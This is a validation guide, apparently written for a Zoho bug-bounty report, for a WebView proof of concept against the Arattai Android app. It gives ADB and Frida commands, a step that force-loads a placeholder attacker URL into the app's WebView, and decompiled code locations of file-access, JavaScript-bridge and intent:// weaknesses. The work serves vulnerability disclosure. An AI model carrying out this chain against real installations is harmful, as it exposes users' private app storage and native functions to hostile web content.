# Arattai WebView PoC — Validation Guide

## Files in this directory

| File | Purpose |
|---|---|
| `webview_exploit.html` | Attacker page — tests file access, bridge, cookies |
| `deeplink_test.bat` | ADB commands to trigger deep links |
| `frida_ssl_bypass.js` | SSL pinning bypass (for Burp interception) |
| `frida_webview_hook.js` | Hooks WebView to log all loads + settings + bridge calls |
| `frida_force_webview.js` | Force-loads attacker URL into active WebView |
| `run_poc.bat` | Step-by-step runner |

---

## Quick Validation (5 minutes)

### Step 1: Start Frida server on emulator
```
adb -s emulator-5554 shell "su -c '/data/local/tmp/frida-server -D &'"
```

### Step 2: Launch app with WebView hooks
```
frida -U -f com.aratai.chat -l frida_webview_hook.js --no-pause
```

### Step 3: Log in to app, then open any business MiniApp in a chat

Watch Frida output for:
```
[SETTINGS] setJavaScriptEnabled(true)
[SETTINGS] setAllowFileAccess(true)          ← VULNERABILITY CONFIRMED
[SETTINGS] setAllowContentAccess(true)       ← VULNERABILITY CONFIRMED  
[SETTINGS] setMixedContentMode(ALWAYS_ALLOW) ← VULNERABILITY CONFIRMED
[JS-BRIDGE] addJavascriptInterface called!
  Bridge Name: "AndroidBridge"               ← BRIDGE CONFIRMED
  @JavascriptInterface: postAction(3 params)
  @JavascriptInterface: postAction(2 params)
```

### Step 4: Test deep link injection
In another terminal:
```
adb -s emulator-5554 shell am start -n com.aratai.chat/com.zoho.chat.ContactAction -a android.intent.action.VIEW -d "https://web.arattai.in/"
```

Watch for:
```
[DEEPLINK] ExternalEntryPointActivity.s0() called
  Action: android.intent.action.VIEW
  Data: https://web.arattai.in/
```

### Step 5: Force-inject attacker URL (proves full chain)
In Frida REPL after a MiniApp WebView is active:
```
rpc.exports.injectUrl("http://YOUR_IP:8888/webview_exploit.html")
```

---

## What makes this valid for Zoho Bug Bounty

### Confirmed (static analysis — code evidence):
1. `setAllowFileAccess(true)` in `gbj.java` line 106
2. `setAllowContentAccess(true)` in `gbj.java` line 107  
3. `setMixedContentMode(0)` in `gbj.java` line 116
4. `addJavascriptInterface(dtl, "AndroidBridge")` in `o5m.smali` line 278
5. `@JavascriptInterface postAction()` in `dtl.java` line 20+98
6. `Intent.parseUri()` in `wbj.java` line 68 (intent:// injection)
7. `shouldOverrideUrlLoading` returns false for ALL http/https in `wbj.java` line 87-88
8. ContactAction exported without permission in `AndroidManifest.xml`
9. Generic `https` scheme handler in `AndroidManifest.xml` line 848

### Needs dynamic confirmation:
- Can deep link URL actually reach the MiniApp WebView? (test logged-in)
- Does `file://` XHR succeed from within the WebView? (test with Frida inject)
- What actions does `AndroidBridge.postAction()` dispatch? (test with Frida hook)

### Even without deep link → WebView chain:
The WebView misconfigurations alone are valid findings:
- Any page loaded in the MiniApp WebView (legitimate business apps) runs with file:// access
- A compromised or malicious mini app can read app internal storage
- The intent:// handler enables privilege escalation from web content
- The JS bridge exposes native functionality to web JS

---

## SSL Pinning Status

Previous assessment confirmed: **ZERO SSL PINNING** in Arattai v1.54.0.

The `frida_ssl_bypass.js` is included for completeness. Traffic is already interceptable 
without any bypass — just set device proxy to Burp and install Burp CA.
